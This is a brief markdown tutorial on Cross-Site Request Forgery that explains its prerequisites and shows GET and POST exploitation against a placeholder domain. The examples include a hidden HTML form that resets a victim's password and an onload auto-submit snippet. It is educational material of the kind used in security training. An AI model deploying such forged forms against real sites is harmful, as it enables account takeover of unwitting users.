# Cross Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing.

  
# Overview and Prerequisites

- **Valuable Action:** One needs to find an action that is worth exploiting, such as, changing user information.
- **Session:** The user's session must only be managed by a cookie.

  
# Exploitation
**Both methods mentioned below can be distributed via *social engineering***

## GET

- This is a normal request to change a user's (`acc`) password (`new_pass`) on a platform
```
GET http://domain.com/action/?acc=test&new_pass=password123
```

- To exploit this and change the password of the victim, one can do this:
```
GET http://domain.com//action/?acc=victim&new_pass=newpassword123
```

  

## POST
- Basic request to change password
```
POST http://domain.com/action/

acc=test&new_pass=password123
```

- To exploit it, one needs to create a fake form which points to the URL that the they need with the attributes needed
```html
<form action="http://domain.com/action/" method="POST">
	<input type="hidden" name="acc" value="victim"/>
	<input type="hidden" name="new_pass" value="newpassword123"/>
	<input type="submit" value="THIS IS A CSRF ATTEMPT"/>
</form>
```

- Since the form needs to be sent, one can just make add an autosubmit functionality to the page:
```html
<body onload="document.forms[0].submit()">
```

  
  

## References

- [https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)
- [https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)